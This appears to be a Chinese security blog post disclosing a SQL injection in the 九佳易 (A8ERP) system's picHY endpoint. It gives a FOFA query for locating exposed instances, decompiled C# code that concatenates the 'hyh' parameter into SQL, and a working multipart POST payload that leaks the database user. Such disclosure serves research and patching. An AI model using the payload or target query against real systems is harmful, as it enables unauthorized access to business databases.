---
title: "九佳易管理系统 picHY.ashx SQL 注入漏洞"
source: https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html
asset_dir: assets/九佳易管理系统-pichy.ashx-sql-注入漏洞
---

# 九佳易管理系统 picHY.ashx SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/27 08:31
* 283浏览
* [0评论](#comment)
* 20分钟阅读

深入探索

客户端

软件

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

九佳易管理系统中的 picHY.ashx 通用处理程序接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，该接口主要用于处理前端 AJAX 请求并与后端数据库进行交互。由于接口未对客户端传入的关键参数进行严格的输入校验、参数化处理或特殊字符转义，攻击者可通过构造恶意的 SQL 语句片段注入到请求参数中，使后端数据库执行非授权的 SQL 操作，进而窃取、篡改甚至销毁数据库中的敏感数据。

SQL注入防护

# 影响版本

# fofa语法

> title="VSQL" && body="/Scripts/Login\_A8/"

# 漏洞分析

根据 picHY.ashx 的代码引用

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="picHY.aspx.cs" Inherits="A8ERP.HuiYuan.HuiYuanDangAn.picHY" %>
```

深入探索

Web安全课程

在线安全工具

防火墙软件

找到 A8ERP.HuiYuan.HuiYuanDangAn.picHY 相关类的实现逻辑

代码安全审计

```
using System;
using System.Collections.Generic;
using System.Data;
using System.Web.UI;
using System.Web.UI.HtmlControls;

#nullable disable
namespace A8ERP.HuiYuan.HuiYuanDangAn;

public class picHY : Page
{
  protected HtmlHead Head1;
  public List<string> piclist = new List<string>();
  public int picCount;

  protected void Page_Load(object sender, EventArgs e)
  {
    string str = this.Request["hyh"];
    DBHelp dbHelp = new DBHelp();
    dbHelp.Open();
    string sql = $"SELECT top 1 default_disp FROM da_hy_pic   where  hyh='{str}'";
    DataTable dataTable = dbHelp.QueryRDataTable(sql);
    this.picCount = ((InternalDataCollectionBase) dataTable.Rows).Count;
    if (this.picCount <= 0)
    {
      this.piclist.Insert(0, "http://localhost:1130/SPPics/HY/jjy.jpg");
    }
    else
    {
      for (int index = 0; index < this.picCount; ++index)
        this.piclist.Insert(index, dataTable.Rows[index][0].ToString());
    }
    dbHelp.Close();
  }
}
```

非常明显拼接导致的SQL注入，参数`string str = this.Request["hyh"];`无任何过滤或校验被直接拼接到`$"SELECT top 1 default_disp FROM da_hy_pic where hyh='{str}'"`sql语句中，然后调用`dbHelp.QueryRDataTable()`方法进行执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

> 因为参数获取是通过`this.Request["hyh"]`的方式，因此支持get、post等常规方式外，还支持multipart格式
>
> 漏洞预警服务

```
POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Host: a8erp.mrxn.net

------WebKitFormBoundary
Content-Disposition: form-data; name="hyh"

'-1/user--
------WebKitFormBoundary--
```

[![九佳易管理系统 picHY.ashx SQL 注入漏洞](images/img-001-abcd5e3185e8.webp)](https://image.mrxn.net/481649191cb140528b3f2b93c74b44a2.webp)

成功利用报错注入在响应回显当前数据库用户信息

编程

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)  
文章链接：<https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

网络

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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